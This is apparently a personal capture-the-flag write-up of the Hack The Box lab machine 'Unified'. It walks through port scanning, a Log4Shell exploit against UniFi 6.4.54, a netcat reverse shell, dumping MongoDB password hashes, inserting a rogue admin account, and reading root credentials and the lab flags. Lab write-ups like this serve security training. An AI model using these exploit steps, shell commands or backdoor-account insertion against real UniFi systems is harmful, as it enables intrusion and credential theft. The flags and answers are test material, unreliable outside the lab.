- - - 
created : 02-08-2025 

Tags : #veryeasy
- - - 
# Objective

Learn how to start.
# CONNECT

To attack the target machine, you must be on the same network.  
Connect to the Starting Point VPN using one of the following options.

It may take a minute for HTB to recognize your connection.  
If you don't see an update after 2-3 minutes, refresh the page.

I will use OpenVPN, so i download the config file, go in the same directory and execute the following command :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB]
└─$ sudo openvpn starting_point_mdn0x.ovpn 
[sudo] password di mdn0x: 
```

We can start our [Vulnerable Machine](../../../../3%20-%20Tags/Hacking%20Concepts/Vulnerable%20Machine.md).

Now we add the target IP to our /etc/hosts file, so we don't have to remember the [IP address](../../../../3%20-%20Tags/Hacking%20Concepts/IP%20address.md) every time :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Starting Point/Tier 0/Meow]
└─$ sudo nano /etc/hosts
```

We add a line with the given IP and a name .
# Task 1

Question 1

```
Which are the first four open ports?
```
## Rustscan/Nmap

We use [Rustscan](../../../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) and pass the result to [Nmap](../../../../3%20-%20Tags/Hacking%20Tools/Nmap.md) with `--` :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/…/Starting Point/Tier 2/Vaccine/Unified]
└─$ rustscan -a unified.htb -- -A 

Open 10.129.193.253:22
Open 10.129.193.253:6789
Open 10.129.193.253:8080
Open 10.129.193.253:8443
Open 10.129.193.253:8843
Open 10.129.193.253:8880

PORT     STATE SERVICE         REASON         VERSION
22/tcp   open  ssh             syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)

6789/tcp open  ibm-db2-admin?  syn-ack ttl 63

8080/tcp open  http            syn-ack ttl 63 Apache Tomcat (language: en)
|_http-open-proxy: Proxy might be redirecting requests
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to https://unified.htb:8443/manage

8443/tcp open  ssl/nagios-nsca syn-ack ttl 63 Nagios NSCA
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-title: UniFi Network
|_Requested resource was /manage/account/login?redirect=%2Fmanage
| ssl-cert: Subject: commonName=UniFi/organizationName=Ubiquiti Inc./stateOrProvinceName=New York/countryName=US/localityName=New York/organizationalUnitName=UniFi
| Subject Alternative Name: DNS:UniFi
| Issuer: commonName=UniFi/organizationName=Ubiquiti Inc./stateOrProvinceName=New York/countryName=US/localityName=New York/organizationalUnitName=UniFi
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-12-30T21:37:24
| Not valid after:  2024-04-03T21:37:24
| MD5:   e6be:8c03:5e12:6827:d1fe:612d:dc76:a919
| SHA-1: 111b:aa11:9cca:4401:7cec:6e03:dc45:5cfe:65f6:d829
| -----BEGIN CERTIFICATE-----
| MIIDfTCCAmWgAwIBAgIEYc4mlDANBgkqhkiG9w0BAQsFADBrMQswCQYDVQQGEwJV
| UzERMA8GA1UECAwITmV3IFlvcmsxETAPBgNVBAcMCE5ldyBZb3JrMRYwFAYDVQQK
| DA1VYmlxdWl0aSBJbmMuMQ4wDAYDVQQLDAVVbmlGaTEOMAwGA1UEAwwFVW5pRmkw
| HhcNMjExMjMwMjEzNzI0WhcNMjQwNDAzMjEzNzI0WjBrMQswCQYDVQQGEwJVUzER
| MA8GA1UECAwITmV3IFlvcmsxETAPBgNVBAcMCE5ldyBZb3JrMRYwFAYDVQQKDA1V
| YmlxdWl0aSBJbmMuMQ4wDAYDVQQLDAVVbmlGaTEOMAwGA1UEAwwFVW5pRmkwggEi
| MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDe9no5CdrT2i5FyDpaZ71+/1y6
| 0WO356cC1Sbbufd1jRzXWom0dipfN7l+i/BI2KLyXPto+p3BVVwbORQe4OwPYnLu
| CGAxZSOAtMieVAV0VpvbO35MJSWrSgf9qY2UAkSV6wMw40jcPI5MtLAS2c4tQYd2
| bfYisnRZ0/ptCnBVTvJ2jzS7cJEgoZx7U1jMy6UkNuasWIGG3Xeyp2jJwuxrGbJb
| aP7jjHHMvZ/TYh9uHq1rQQlDM4bHMRP+bPB2D6wuQIR3Dsd8ztdi0DpfP/QZp2tE
| iavKrLBpUvAc96g2iEaF3b0piqkzUP31ijqc1RZxW2zaGMl2J9iCBm/eerh7AgMB
| AAGjKTAnMBMGA1UdJQQMMAoGCCsGAQUFBwMBMBAGA1UdEQQJMAeCBVVuaUZpMA0G
| CSqGSIb3DQEBCwUAA4IBAQAFvT2p6uA8sUGzz1WKbQjDPTeRM/ghhPCCqhWH3jF6
| 9udW490Mv0mSZS4pBtcttnJ4D5IWnOeYoxoxw7ZAODhzvzcZ3w6RjnDy7WOB9e0/
| 2ky4i+ABn2tfztNWTa2OBLM3bW1X15D3J7CHSGW1BOP2pA7ersOuP0/IV7Jo61Ok
| FbxK5+8qn5ASRDZTeyCI//l5uYVjd19g7yNs850mv4hB8Y0I0PAzTLKVchv+A8VO
| A2DeT8snk1C5L2Jw+WugNwdeyKqmmZRBKfo0KuQz0YG40zxx0SCAKnIXpUSrnlCU
| VwtOH3PmERL30HjgR25E0RePOUepiX8psGR4CGV2U+dg
|_-----END CERTIFICATE-----


8843/tcp open  ssl/http        syn-ack ttl 63 Apache Tomcat (language: en)
|_http-title: HTTP Status 400 \xE2\x80\x93 Bad Request
| ssl-cert: Subject: commonName=UniFi/organizationName=Ubiquiti Inc./stateOrProvinceName=New York/countryName=US/localityName=New York/organizationalUnitName=UniFi
| Subject Alternative Name: DNS:UniFi
| Issuer: commonName=UniFi/organizationName=Ubiquiti Inc./stateOrProvinceName=New York/countryName=US/localityName=New York/organizationalUnitName=UniFi
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-12-30T21:37:24
| Not valid after:  2024-04-03T21:37:24
| MD5:   e6be:8c03:5e12:6827:d1fe:612d:dc76:a919
| SHA-1: 111b:aa11:9cca:4401:7cec:6e03:dc45:5cfe:65f6:d829
| -----BEGIN CERTIFICATE-----
| MIIDfTCCAmWgAwIBAgIEYc4mlDANBgkqhkiG9w0BAQsFADBrMQswCQYDVQQGEwJV
| UzERMA8GA1UECAwITmV3IFlvcmsxETAPBgNVBAcMCE5ldyBZb3JrMRYwFAYDVQQK
| DA1VYmlxdWl0aSBJbmMuMQ4wDAYDVQQLDAVVbmlGaTEOMAwGA1UEAwwFVW5pRmkw
| HhcNMjExMjMwMjEzNzI0WhcNMjQwNDAzMjEzNzI0WjBrMQswCQYDVQQGEwJVUzER
| MA8GA1UECAwITmV3IFlvcmsxETAPBgNVBAcMCE5ldyBZb3JrMRYwFAYDVQQKDA1V
| YmlxdWl0aSBJbmMuMQ4wDAYDVQQLDAVVbmlGaTEOMAwGA1UEAwwFVW5pRmkwggEi
| MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDe9no5CdrT2i5FyDpaZ71+/1y6
| 0WO356cC1Sbbufd1jRzXWom0dipfN7l+i/BI2KLyXPto+p3BVVwbORQe4OwPYnLu
| CGAxZSOAtMieVAV0VpvbO35MJSWrSgf9qY2UAkSV6wMw40jcPI5MtLAS2c4tQYd2
| bfYisnRZ0/ptCnBVTvJ2jzS7cJEgoZx7U1jMy6UkNuasWIGG3Xeyp2jJwuxrGbJb
| aP7jjHHMvZ/TYh9uHq1rQQlDM4bHMRP+bPB2D6wuQIR3Dsd8ztdi0DpfP/QZp2tE
| iavKrLBpUvAc96g2iEaF3b0piqkzUP31ijqc1RZxW2zaGMl2J9iCBm/eerh7AgMB
| AAGjKTAnMBMGA1UdJQQMMAoGCCsGAQUFBwMBMBAGA1UdEQQJMAeCBVVuaUZpMA0G
| CSqGSIb3DQEBCwUAA4IBAQAFvT2p6uA8sUGzz1WKbQjDPTeRM/ghhPCCqhWH3jF6
| 9udW490Mv0mSZS4pBtcttnJ4D5IWnOeYoxoxw7ZAODhzvzcZ3w6RjnDy7WOB9e0/
| 2ky4i+ABn2tfztNWTa2OBLM3bW1X15D3J7CHSGW1BOP2pA7ersOuP0/IV7Jo61Ok
| FbxK5+8qn5ASRDZTeyCI//l5uYVjd19g7yNs850mv4hB8Y0I0PAzTLKVchv+A8VO
| A2DeT8snk1C5L2Jw+WugNwdeyKqmmZRBKfo0KuQz0YG40zxx0SCAKnIXpUSrnlCU
| VwtOH3PmERL30HjgR25E0RePOUepiX8psGR4CGV2U+dg
|_-----END CERTIFICATE-----


8880/tcp open  http            syn-ack ttl 63 Apache Tomcat (language: en)
|_http-title: HTTP Status 400 \xE2\x80\x93 Bad Request
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=8/2%OT=22%CT=%CU=36612%PV=Y%DS=2%DC=T%G=N%TM=688E2158%
OS:P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=105%TI=Z%CI=Z%II=I%TS=A)OPS(O
OS:1=M552ST11NW7%O2=M552ST11NW7%O3=M552NNT11NW7%O4=M552ST11NW7%O5=M552ST11N
OS:W7%O6=M552ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R
OS:=Y%DF=Y%T=40%W=FAF0%O=M552NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%
OS:RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y
OS:%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R
OS:%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RU
OS:D=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 5.825 days (since Sun Jul 27 20:44:27 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=256 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8080/tcp)
HOP RTT       ADDRESS
1   254.78 ms 10.10.14.1
2   255.10 ms unified.htb (10.129.193.253)

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:31
Completed NSE at 16:31, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:31
Completed NSE at 16:31, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:31
Completed NSE at 16:31, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 193.51 seconds
           Raw packets sent: 49 (3.038KB) | Rcvd: 36 (2.286KB)

```

The answer is : `22,6789,8080,8443`.
# Task 2

What is the title of the software that is running running on port 8443?

Looking at [Nmap](../../../../3%20-%20Tags/Hacking%20Tools/Nmap.md) previous scan :

```bash
 UniFi Network
```
# Task 3

What is the version of the software that is running?

We can find it out on the page : https://IP:8443/ :

![Pasted image 20250802163822.png](../../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250802163822.png)

```bash
  6.4.54
```
# Task 4

What is the CVE for the identified vulnerability?
## Google Search

We can use Google to search for the [Exploit](../../../../3%20-%20Tags/Hacking%20Concepts/Exploit.md) and the relative CVE :

```bash
 CVE-2021-44228
```

This Log4J vulnerability can be exploited by injecting operating system commands (OS Command Injection),
which is a web security vulnerability that allows an attacker to execute arbitrary operating system
commands on the server that is running the application and typically fully compromise the application and
all its data.
# Task 5

What protocol does JNDI leverage in the injection?

JNDI is the acronym for the Java Naming and Directory Interface API . By making calls to this API,
applications locate resources and other program objects. A resource is a program object that provides
connections to systems, such as database servers and messaging systems.

LDAP is the acronym for Lightweight Directory Access Protocol , which is an open, vendor-neutral,
industry standard application protocol for accessing and maintaining distributed directory information services over the Internet or a Network. The default port that LDAP runs on is port 389 .

```bash
  LDAP
```
# Task 6

What tool do we use to intercept the traffic, indicating the attack was successful?

```bash
 tcpdump
```
# Task 7

What port do we need to inspect intercepted traffic for?

```bash
 389
```
# Task 8

What port is the MongoDB service running on?
## Exploit 

First we need to clone this [Github](../../../../3%20-%20Tags/Hacking%20Concepts/Github.md) repo and it's dependencies following the instructions : https://github.com/puzzlepeaches/Log4jUnifi

```bash
apt update && apt install openjdk-11-jre maven

git clone --recurse-submodules https://github.com/puzzlepeaches/Log4jUnifi

cd Log4jUnifi 

python3 -m venv venv

source venv/bin/activate

pip3 install -r requirements.txt

mvn package -f utils/rogue-jndi/
```

Now we open a listener with [Netcat](../../../../3%20-%20Tags/Hacking%20Tools/Netcat.md) :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/Documenti/GitTools]
└─$ nc -lvnp 1337            
```

And we execute the [Exploit](../../../../3%20-%20Tags/Hacking%20Concepts/Exploit.md) :

```bash
python3 exploit.py -u http://unified.htb:8443 -i 10.10.14.108 -p 1337  
```

We should have a shell as unifi :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/Documenti/GitTools/Log4jUnifi]
└─$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.14.108] from (UNKNOWN) [10.129.96.149] 42736
whoami
unifi
```
## Shell Stabilization

For a better shell, execute the following commands :

```
script /dev/null -c bash 
export TERM=xterm 
"ctrl + x" 
stty raw -echo;fg
```

We can dump a JSON array of users and their password hashes using this command : `mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"` :

```
MongoDB shell version v3.6.3
connecting to: mongodb://127.0.0.1:27117/ace
MongoDB server version: 3.6.3
{
        "_id" : ObjectId("61ce278f46e0fb0012d47ee4"),
        "name" : "administrator",
        "email" : "administrator@unified.htb",
        "x_shadow" : "$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.",
        "time_created" : NumberLong(1640900495),
        "last_site_name" : "default",
        "ui_settings" : {
```

The answer is port `27117`.
# Task 9

What is the default database name for UniFi applications?

```
 ace
```
# Task 10

What is the function we use to enumerate users within the database in MongoDB?

```
 db.admin.find()
```
# Task 11

What is the function we use to update users within the database in MongoDB?

```
db.admin.update()
```
# Task 12

What is the password for the root user?

Cracking the hash might take time so we’re going to add our an admin user to the database.

First, we need to generate a sha-512 hash with the following command :

```
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Starting Point/Tier 2/Unified]
└─$ mkpasswd -m sha-512 pass123
$6$SSujgU1OdKBcSCxa$EJMOx3qNYgvelfhmrCGbprSuZkhJhID3DJEra13MT/tamMVMFO69EKWPfSM3lwtBuqWA5NH4l2B7ubw4RzULt.
```

Then we add our shadow admin with this command :

```
mongo --port 27117 ace --eval 'db.admin.insert({ "email" : "null@localhost.local", "last_site_name" : "default", "name" : "unifi-admin", "time_created" : NumberLong(100019800), "x_shadow" : "$6$SSujgU1OdKBcSCxa$EJMOx3qNYgvelfhmrCGbprSuZkhJhID3DJEra13MT/tamMVMFO69EKWPfSM3lwtBuqWA5NH4l2B7ubw4RzULt." })'
```

Now we run this command to check if our admin has been added. `mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"`.

Yes, it’s there. Now let’s go back to Unifi login page and sign in using the credentials we just registered, in my case: `unifi-admin:pass123`.

From this point,we should go to settings -> Site and find the following ssh credentials. `root:NotACrackablePassword4U2022`.
# Submit Flags

## Submit user flag

We login with [SSH](../../../../3%20-%20Tags/Hacking%20Concepts/SSH.md) credentials and find it in home :

```
root@unified:/home# cd michael/
root@unified:/home/michael# ls
user.txt
root@unified:/home/michael# cat user.txt
6ced1a6a89e666c0620cdb10262ba127
```
## Submit root flag 

```
root@unified:~# ls
root.txt
root@unified:~# cat root.txt
e50bc93c75b634e4b272d2f771c33681
```

Pwned !!